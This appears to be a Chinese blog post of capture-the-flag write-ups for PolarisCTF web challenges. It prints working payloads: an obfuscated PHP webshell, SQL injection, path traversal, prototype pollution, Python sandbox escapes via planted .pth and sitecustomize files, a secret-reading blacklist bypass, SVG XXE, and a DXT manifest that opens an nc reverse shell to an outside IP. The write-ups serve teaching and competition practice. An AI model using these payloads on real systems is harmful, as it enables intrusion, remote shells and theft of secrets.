---
title: PolarisCTF
date: 2026-03-29 10:25:01
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/image-20260331151901097.png
categories: CTF
---

## only real

#### 非预期

直接看/flag.php就行

#### revenge

jwt爆破密钥伪造admin之后就可以上传图片，后端对文件类型没有校验，直接抓包修改文件后缀名，文件内容有WAF，我们使用ascii🐎

```php
<?=
$func=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$cmd='';
$cmd_chars=[99, 97, 116, 32, 47, 102, 108, 97, 103];
foreach($cmd_chars as $ascii){
    $cmd.=chr($ascii);
}
@$func($cmd);
```

## Broken Trust

一个登录界面，注册可以获取UID，进去发现有管理员工具，推测需要拿到管理员权限

查看源代码发现一个UID查询的api接口

![image-20260329131243258](https://gitee.com/bobrocket/img/raw/master/image-20260329131243258.png)

测试SQL注入

```
{"uid":"'or '1'='1"}
```

成功查询到了admin的UID

管理员可以读取文件，我们用路径遍历读flag

```
/api/admin?action=backup&file=....//....//....//....//flag
```

## ez_python

```python
from flask import Flask, request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Config:
    def __init__(self):
        self.filename = "app.py"

class Polaris:
    def __init__(self):
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"

@app.route('/read')
def read():
    return open(instance.config.filename).read()

@app.route('/src')
def src():
    return open(__file__).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

简单的原型链污染，直接污染config下的filename

```json
{"config":{"filename":"/flag"}}
```

访问/read即可

## ezpollute

```js
const express = require('express');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

function merge(target, source, res) {
    for (let key in source) {
        if (key === '__proto__') {
            if (res) {
                res.send('get out!');
                return;
            }
            continue;
        } 
        
        if (source[key] instanceof Object && key in target) {
            merge(target[key], source[key], res);
        } else {
            target[key] = source[key];
        }
    }
}

let config = {
    name: "CTF-Guest",
    theme: "default"
};

app.post('/api/config', (req, res) => {
    let userConfig = req.body;

    const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];
    const bodyStr = JSON.stringify(userConfig).toLowerCase();
    for (let word of forbidden) {
        if (bodyStr.includes(`"${word}"`)) {
            return res.status(403).json({ error: `Forbidden keyword detected: ${word}` });
        }
    }

    try {
        merge(config, userConfig, res);
        res.json({ status: "success", msg: "Configuration updated successfully." });
    } catch (e) {
        res.status(500).json({ status: "error", message: "Internal Server Error" });
    }
});

app.get('/api/status', (req, res) => {

    const customEnv = Object.create(null);
    for (let key in process.env) {
        if (key === 'NODE_OPTIONS') {
            const value = process.env[key] || "";

            const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;

            if (!dangerousPattern.test(value)) {
                customEnv[key] = value;
            }
            continue;
        }
        customEnv[key] = process.env[key];
    }
    
    const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
        env: customEnv,
        shell: false 
    });
    
    let output = '';
    proc.stdout.on('data', (data) => { output += data; });
    proc.stderr.on('data', (data) => { output += data; });
    
    proc.on('close', (code) => {
        res.json({ 
            status: "checked", 
            info: output.trim() || "No output from system check."
        });
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Flag 位于 /flag
app.listen(3000, '0.0.0.0', () => {
    console.log('Server running on port 3000');
});
```

主要有两个api接口

- /api/config 接口存在自定义的 merge 函数，用于合并用户配置。
- /api/status 接口会启动一个 node 子进程，并手动构建 customEnv 环境变量。

漏洞点：/api/config使用 Node.js 的 `child_process` 模块来启动一个新的子进程,并且加载了环境变量，而这个变量NODE_OPTIONS是可污染的，正则过滤仅检查了--，而我们可以用-r来加载flag

虽然没merge函数禁用了prototype但是在 Node.js 中，可以通过 constructor.prototype 污染全局 Object.prototype。

在/api/config污染：

```
{"constructor":{"prototype":{"NODE_OPTIONS":"-r /flag"}}}
```

- `NODE_OPTIONS`
  这是一个特殊的环境变量。Node.js 在启动时会读取这个变量的值，并将其内容当作命令行参数来处理。这使得开发者可以在不修改启动命令的情况下，为 Node.js 进程传递全局配置。
- `-r` (或 `--require`)
  这是 Node.js 的一个命令行选项。它的作用是在执行主程序代码之前，**预加载（require）** 指定的模块或文件。被预加载的文件会优先于你的应用代码执行。

进入/api/status,由于/flag的内容不符合js的语法规范，于是就会在报错里面吐出来

![image-20260330165328425](https://gitee.com/bobrocket/img/raw/master/image-20260330165328425.png)



## AutoPypy

一个python沙箱，主要有两个功能，上传代码和执行代码

我们先探测一下环境

```python
import sys
import os

print("Python version:", sys.version)
print("Current dir:", os.getcwd())
print("List files:", os.listdir('.'))
print("ENV:", dict(os.environ))
```

从输出中发现：

- Python 版本: 3.10.19
- 当前目录: `/app`
- 环境变量中有 `KUBERNETES_SERVICE_HOST=unix:///var/run/docker.sock`，说明运行在 Kubernetes/Docker 环境中

我们尝试经典的沙箱逃逸

通过 `__subclasses__` 获取 `os._wrap_close` 类：

```python
classes = (()).__class__.__bases__[0].__subclasses__()
_wrap_close = classes[138]  # os._wrap_close
popen = _wrap_close.__init__.__globals__['popen']
```

成功获取了 `popen` 函数，可以执行系统命令。

尝试读取 `/app/run.py` 文件，发现无论使用什么路径 (`/app/run.py`, `../app/run.py`, `./run.py` 等)，读取到的内容都是我们上传的代码本身。

这说明沙箱使用了某种 **overlay 文件系统** 或 **bind mount** 机制，劫持了对 `/app/run.py` 的访问。

### 方法一

尝试连接本地端口，发现端口 5000 开放（Flask 应用端口）：

```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('127.0.0.1', 5000))
# Port 5000 is open
```

通过 socket 直接发送 HTTP 请求到本地 Flask 应用：

```python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 5000))
request = b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
sock.send(request)
```

发现 `/run` 端点接受 POST 请求，参数为 JSON 格式的 `{"filename": "xxx.py"}`。

尝试通过 `/run` 端点读取不同路径的文件：

```python
import json
body = json.dumps({"filename": "../../flag"})
request = f"POST /run HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}"
```

当尝试 `../../flag` 或 `/flag` 时，服务器返回了错误信息：

```python
Launching sandbox...
ok
  File "/app/run.py", line 1
    xmctf{699f4568de00f2df35f98005567398d3}
            ^
SyntaxError: invalid syntax
```

exp:

```python
import requests

base_url = "http://5000-f71ed300-8492-40f2-aa41-da09de3089db.challenge.ctfplus.cn/"

# 利用路径遍历读取 flag
code = '''
def http_post_json(filename):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(('127.0.0.1', 5000))
    
    body = json.dumps({"filename": filename})
    content_length = len(body)
    request = f"POST /run HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Type: application/json\\r\\nContent-Length: {content_length}\\r\\n\\r\\n{body}".encode()
    
    sock.send(request)
    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    sock.close()
    return response.decode()

# 读取 flag
response = http_post_json("../../flag")
print(response)
'''

files = {'file': ('exploit.py', code.encode())}
data = {'filename': 'exploit.py'}

# 上传
r = requests.post(f"{base_url}/upload", files=files, data=data)
print("Upload:", r.text)

# 执行
r = requests.post(f"{base_url}/run", json={"filename": "exploit.py"})
print("Run:", r.json())
```

### 方法二

系统通过 launcher.py 调用 proot 来运行 Python 脚本。虽然 proot 限制了 /app/run.py 的执行环境，但 **launcher.py** **本身是在宿主机环境运行的**。 server.py 调用方式如下：

```
proc = subprocess.run(
            [sys.executable, launcher_path, target_file],
            capture_output=True,
            text=True,
            timeout=5,
            cwd=BASE_DIR 
        )
```

这意味着 sys.executable（宿主机的 Python 解释器）在启动时会加载宿主机的环境配置。

Python 在初始化阶段，会扫描 site-packages 目录下的所有 .pth 文件。如果 .pth 文件中包含以 import 开头的行，Python 会在启动过程中执行该行代码。这是一个隐蔽的 RCE（远程代码执行）点。

利用 /upload 接口，将恶意代码写入该目录下的一个 .pth 文件中

`../../../../../usr/local/lib/python3.10/site-packages/pwn.pth`

```python
import os; print(os.popen('cat /flag').read()); import sys; sys.exit(0)
```

![image-20260330185300808](https://gitee.com/bobrocket/img/raw/master/image-20260330185300808.png)

### 方法三

上传的 py 文件可以任意写，我们利用 sitecustomize 的自动加载机制运行代码

py 文件写成这样上传

```python
import os,sys,subprocess
print(subprocess.getoutput('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /app/flag.txt 2>/dev/null')) # 尝试用shell读取各种路径的flag
sys.stdout.flush();os._exit(0)
```

这里命名用 /usr/local/lib/python3.10/site-packages/sitecustomize.py

服务器启动时会 import site，顺便 import 这个包，代码就会在沙箱启动前执行

## DXT

首先我们要搞清楚什么是MCP

### 🤖 Model Context Protocol (模型上下文协议)

这是一个在人工智能（AI）领域，特别是大模型应用开发中非常热门的概念。

你可以把它想象成 AI 领域的 **“USB-C 接口”**。就像 USB-C 接口让各种电子设备能用统一的线缆连接和充电一样，MCP 是一个标准化的协议，旨在解决大模型与外部数据、工具和服务之间的连接问题。

- **核心目的**：让 AI 模型能够以统一、标准化的方式，去发现和调用各种外部能力，比如读取数据库、访问文件系统、调用第三方 API 等。
- **解决的问题**：在 MCP 出现之前，开发者为 AI 模型接入每一个新工具都需要编写一套特定的适配代码，过程繁琐且难以复用。MCP 通过定义一套通用协议，极大地简化了这一过程，降低了开发门槛和成本。
- **主要构成**：它通常采用客户端-服务器（Client-Server）架构，主要包括：
  1. **MCP 主机 (Host)**：运行 AI 模型的应用程序，例如 AI 助手、IDE 插件等。
  2. **MCP 客户端 (Client)**：内嵌在主机中，负责与 MCP 服务器通信。
  3. **MCP 服务器 (Server)**：一个轻量级程序，用于向 AI 模型暴露特定的工具、数据或资源。

那么dxt是个什么文件？

Desktop Extensions (DXT，桌面扩展) 是一种用于打包和分发本地MCP (Model Context Protocol) 服务器的标准化格式。它类似于Chrome扩展(.crx)或VS Code扩展(.vsix)，允许用户通过单次点击安装本地MCP服务器。

本质上和zip差不多，实际操作可以打包一个zip然后直接改后缀名为dxt

结合 MCP 协议特点，后端逻辑是：接收 .dxt（实为 ZIP 包） -> 解压读取 manifest.json -> 根据配置拉起服务进程。
由于后端未对 manifest.json 中的启动命令（mcp_config）做严格的过滤校验，直接将其投入系统进程执行，导致存在任意命令执行 (RCE) 漏洞。无前端回显，需通过外带 (OOB) 获取 flag。

下面我们写一个恶意manifest.json

```json
{
    "manifest_version": "0.3",
    "dxt_version": "1.0",
    "name": "exp",
    "display_name": "exp",
    "version": "1.0.0",
    "description": "pwn",
    "author": {
        "name": "a",
        "email": "a@a.com"
    },
    "server": {
        "type": "binary",
        "entry_point": "server/dummy",
        "mcp_config": {
            "command": "sh",
            "args": [
                "-c",
                "nc 183.66.27.22:18546 -e /bin/sh"
            ]
        }
    },
    "tools": []
}
```

压缩zip之后改后缀名上传

![image-20260331190511502](https://gitee.com/bobrocket/img/raw/master/image-20260331190511502.png)

## 醉里挑灯看剑

源码太长加上不会TS审起来有点困难，这里先贴一个ai的wp

### 题目信息

- **题目名称**: Workflow Service
- **题目描述**: "谁知道呢，他们说ts是世界上最好的语言"
- **服务地址**: `http://80-881b111e-485f-42db-8fda-591706498a05.challenge.ctfplus.cn/`
- **附件**: `server.ts` (Bun + TypeScript 服务端代码)

### 题目分析

#### 服务架构

这是一个基于 Bun 运行时的 TypeScript Web 服务，提供以下 API 端点：

| 端点 | 方法 | 功能 |
|------|------|------|
| `/api/auth/guest` | POST | 获取访客 Token |
| `/api/caps/sync` | POST | 同步能力快照 (guest only) |
| `/api/session/self` | GET | 查看当前会话信息 |
| `/api/release/execute` | POST | 执行表达式 (需要 maintainer + release 权限) |
| `/api/release/challenge` | POST | 获取挑战 nonce |
| `/api/release/claim` | POST | 提交 proof 获取 FLAG |

#### 目标

获取 FLAG 需要满足以下条件：
1. 拥有 `maintainer` + `release` 权限
2. Session 角色必须是 `guest`
3. 提交正确的 `proof = SHA1(sid:nonce:RUNNER_KEY)`

---

### 漏洞挖掘

#### 漏洞一：权限提升 (SQL COALESCE + NULL 注入)

**漏洞代码位置**: `normalizeSyncRows` 函数 (第 598-614 行)

```typescript
const keepRole = input.keepRole !== false;
const keepLane = input.keepLane !== false;

const row: Record<string, unknown> = {
  sid: claims.sid,
  source,
  note,
  stamp: now + i
};

if (keepRole) {
  row.role = 'guest';
}

if (keepLane) {
  row.lane = 'public';
}
```

**问题分析**:
- 当 `keepRole: false` 时，`row.role` 不会被设置
- 当 `keepLane: false` 时，`row.lane` 不会被设置
- 数据库插入时，这些字段会存储为 **NULL**

**权限检查逻辑** (`getEffectiveCapability` 函数):

```sql
SELECT
  COALESCE(role, 'maintainer') AS role,
  COALESCE(lane, 'release') AS lane,
  ...
FROM capability_snapshots
WHERE sid = ${sid}
ORDER BY id DESC
LIMIT 1
```

**关键漏洞**: `COALESCE(NULL, 'maintainer')` 返回 `'maintainer'`！

这意味着我们可以通过注入 NULL 值，让数据库默认将权限提升为 `maintainer` + `release`。

---

#### 漏洞二：表达式沙箱绕过 (字符串拼接)

**漏洞代码位置**: `lintExpression` 函数 (第 640-655 行)

```typescript
const BLOCKED_EXPRESSION_TOKENS = [
  'process',
  'globalthis',
  'constructor',
  'function',
  'require',
  'import',
  'fetch',
  'bun',
  'http',
  'spawn',
  'eval',
  'node:',
  'child_process',
  'websocket'
] as const;

function lintExpression(expr: string): void {
  const lowered = expr.toLowerCase();
  for (const token of BLOCKED_EXPRESSION_TOKENS) {
    if (lowered.includes(token)) {
      throw new Error(`expression contains blocked token: ${token}`);
    }
  }
}
```

**问题分析**:
- 黑名单检测使用 `includes()` 进行字符串匹配
- 但 JavaScript 支持字符串拼接和属性访问器语法

**绕过方式**:
```javascript
[].filter['constru'+'ctor']('return this')()['pro'+'cess'].env.RUNNER_KEY
```

这个表达式：
1. `[]` 创建空数组
2. `.filter` 访问数组的 filter 方法
3. `['constru'+'ctor']` 通过字符串拼接绕过黑名单，访问 `constructor`
4. `('return this')()` 创建并执行函数返回全局对象
5. `['pro'+'cess']` 再次绕过黑名单访问 `process`
6. `.env.RUNNER_KEY` 获取环境变量中的密钥

---

### 攻击流程

#### Step 1: 获取 Guest Token

```bash
curl -X POST "http://target/api/auth/guest"
```

**响应**:
```json
{
  "ok": true,
  "token": "eyJleHAiOjE3NzQ3NTE4MTM3NzMs...",
  "claims": {
    "sid": "sid_554533c1f790",
    "role": "guest",
    ...
  }
}
```

#### Step 2: 注入 NULL 权限

```bash
curl -X POST "http://target/api/caps/sync" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "ops": [
      {"source": "test1", "keepRole": false, "keepLane": false},
      {"source": "test2", "keepRole": false, "keepLane": false}
    ]
  }'
```

**关键点**: 设置 `keepRole: false` 和 `keepLane: false`，让 role/lane 字段为 NULL。

**验证权限提升**:
```bash
curl "http://target/api/session/self" -H "Authorization: Bearer <token>"
{
  "recentCaps": [
    {
      "id": 22,
      "role": null,    // NULL 会被 COALESCE 转换为 'maintainer'
      "lane": null,    // NULL 会被 COALESCE 转换为 'release'
      "source": "test2"
    }
  ]
}
```

#### Step 3: 绕过表达式过滤获取 RUNNER_KEY

```bash
curl -X POST "http://target/api/release/execute" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "expression": "[].filter[\"constru\"+\"ctor\"](\"return this\")()[\"pro\"+\"cess\"].env.RUNNER_KEY",
    "input": {}
  }'
```

**响应**:
```json
{
  "ok": true,
  "cap": {
    "role": "maintainer",
    "lane": "release"
  },
  "result": "VHk74Q3dnKezCzdmIN4Hq3gnXWOCoVVFDoGb7ZWu"
}
```

成功获取 `RUNNER_KEY`！

#### Step 4: 获取 Challenge Nonce

```bash
curl -X POST "http://target/api/release/challenge" \
  -H "Authorization: Bearer <token>"
```

**响应**:
```json
{
  "ok": true,
  "sid": "sid_554533c1f790",
  "nonce": "f2bd2267a179f8685a8d1724",
  "formula": "sha1(sid + \":\" + nonce + \":\" + releaseSecret)"
}
```

#### Step 5: 计算 Proof

根据公式 `proof = SHA1(sid:nonce:RUNNER_KEY)`:

```bash
echo -n "sid_554533c1f790:f2bd2267a179f8685a8d1724:VHk74Q3dnKezCzdmIN4Hq3gnXWOCoVVFDoGb7ZWu" | sha1sum
# 115c8c4be6c05d6078dceccf40d3a78e976b870e
```

#### Step 6: 提交 Proof 获取 FLAG

```bash
curl -X POST "http://target/api/release/claim" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "nonce": "f2bd2267a179f8685a8d1724",
    "proof": "115c8c4be6c05d6078dceccf40d3a78e976b870e"
  }'
```

**响应**:

```json
{
  "ok": true,
  "sid": "sid_554533c1f790",
  "flag": "XMCTF{3d386f6d-0b10-4c73-b451-b879d7d2bd6e}"
}
```

## Not a Node

### 前置知识

#### 使用Error.prepareStackTrace技巧

这是一个**V8/JSC引擎的特性**，用于自定义错误堆栈的显示方式。

```javascript
// 定义自定义的堆栈格式化函数
Error.prepareStackTrace = function(error, stack) {
    // error: 错误对象
    // stack: CallSite对象数组，包含调用栈信息
    return "custom stack";
};

// 触发一个错误来测试
try {
    throw new Error("test");
} catch (e) {
    console.log(e.stack);
}
```

**原理**：当JavaScript引擎准备显示错误堆栈时，会调用`Error.prepareStackTrace`函数。通过修改这个函数，我们可以在错误发生时执行自定义代码。

#### 获取全局对象

使用`(0, eval)("this")`技巧：

```javascript
// (0, eval) 将eval作为普通函数调用，而不是直接调用
// "this" 在eval中指向全局对象
let global = (0, eval)("this");
console.log(global);
```

**为什么这样写？**

- `(0, eval)`是JavaScript的一个技巧，确保eval在全局作用域执行

**格式？**

```
(0, eval)
(1, eval)
(null, eval)
('', eval)
[eval][0]
window.eval		#浏览器中
global.eval		#node.js中
```

#### 关于JSC

**JSC = JavaScriptCore**

是 Safari / 边缘计算用的浏览器引擎，**无 Node.js 原生 API**

#### 关于Uint8Array

Uint8Array是JavaScript中的**类型化数组**，用于表示8位无符号整数数组。它可以用来处理二进制数据。

```js
// 创建一个Uint8Array
let arr = new Uint8Array([72, 101, 108, 108, 111]);  // "Hello"

// 将字符串转为Uint8Array
let encoder = new TextEncoder();
let bytes = encoder.encode("Hello");  // Uint8Array [72, 101, 108, 108, 111]

// 将Uint8Array转回字符串
let decoder = new TextDecoder();
let str = decoder.decode(bytes);  // "Hello"
```

而二进制数据，一般直接作为原始字节传递，不被当作字符串处理

### 题目

我们搭建了一个“安全”的在线 JavaScript 运行平台。

你提交的代码会被放进一个精心准备的沙箱中运行，一切看起来很干净

![image-20260401140620175](https://gitee.com/bobrocket/img/raw/master/20260401140627386.png)

### 解

拿到题不会做也没啥想法，跟着ai走一遍学习学习

#### 第一步：信息收集

网站右侧

```
Fetch API standards fully supported in the JSC sandboxed context.
#Fetch API 标准在 JSC 沙箱环境中被完全支持。
```

说明无法使用node.js原生api

```
__runtime.hash(str)
High-performance DJB2 hashing.

__runtime.encoding.hexEncode(s)
e.g. hexEncode("internal") -> 696e7465...
```

泄露使用了`__runtime` 的几个函数

```
Advanced
The runtime exposes documented APIs through the __runtime global. Platform orchestration may rely on additional internal bindings not listed here.
#高级
#运行时通过 __runtime 全局对象暴露已公开的 API。
#平台调度可能依赖此处未列出的其他内部绑定（方法）。
```

提示可能利用`__runtime` 的其他函数？

#### 第二步：进一步信息收集找可利用方法

探测runtime中的可用属性，注意由于返回内容包含对象，要使用JSON.stringify处理返回内容，并且需要Object.getOwnPropertyNames获取所有属性（否则函数，下划线开头等属性不会显示）

```js
export default {
    async fetch(req) {
        let runtime = (0, eval)("this").__runtime;

        // 列出所有自身属性（包括 _internal / _secrets / _debug）
        let allKeys = Object.getOwnPropertyNames(runtime);

        return new Response(JSON.stringify(allKeys));
    }
};

//回显
//["hash","strlen","platform","perf","encoding","_debug","_secrets","_internal"]
```

可以发现runtime中`"_debug" "_secrets" "_internal"`这三个比较可疑

分别列出其中可用函数

```js
export default {
    async fetch(req) {
        let s = __runtime._secrets;

        // 看 _secrets 下有哪些函数/属性
        let keys = Object.getOwnPropertyNames(s);

        return new Response(JSON.stringify(keys));
    }
};
```

```
_debug : ["enabled","trace","dump","inspect"]
_secrets : ["get","list"]
_internal : ["debug","lib"]
```

没啥发现，挨个看看

在看到_internal.lib.symbols时

```js
export default {
    async fetch(req) {
        let s = __runtime._internal.lib.symbols;
        let keys = Object.getOwnPropertyNames(s);
        return new Response(JSON.stringify(keys));
    }
};
//回显
//["_0x72656164","_0x6c697374"]
```

0x开头推测是16进制，解码一下分别是read和list

尝试直接调用read函数读/flag

```js
export default {
  async fetch(request) {
    let flag = __runtime._internal.lib.symbols._0x72656164('/flag');
    return new Response(JSON.stringify(flag));    
  }
}

//回显
//"ERROR: The argument 'path' must be a string, Uint8Array, or URL without null bytes. Received \"/app/\\u0000\\u0000\\u0000\\u0000\\u0000\""
```

错误信息告诉我们几个重要信息：

1. **路径被修改了**：我们传入的是`"/flag"`，但系统收到的是`"/app/\u0000\u0000..."`
2. **支持Uint8Array**：错误说参数可以是string、Uint8Array或URL
3. **null bytes问题**：路径中出现了`\u0000`（空字符）

**推测**：

- 系统在处理字符串路径时，会在前面加上`/app/`
- 可能因为某些内存对齐问题，后面跟着空字节
- 但如果使用Uint8Array，可能绕过这个处理

```js
export default {
  async fetch(request) {
  	let encoder = new TextEncoder();
	let path = encoder.encode("/flag");
    let flag = __runtime._internal.lib.symbols._0x72656164(path);
    return new Response(JSON.stringify(flag));    
  }
}

//回显
//xmctf{......}
```

拿到flag

## 头像上传器

一个用户界面支持上传头像（.svg/.png）,在/api/avatar.php可以查看渲染的头像

尝试一下svg xxe

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

也是成功读到了

## 总结

比赛就Web一个方向还是不错的，题目有难度梯度知识面也很广，对我这种蒟蒻来说很友好，可以练习一下已经学过的知识也可以拓展知识面，学习了TS、js沙箱、MCP等知识，以后有时间一定把剩下的题看一看。。。
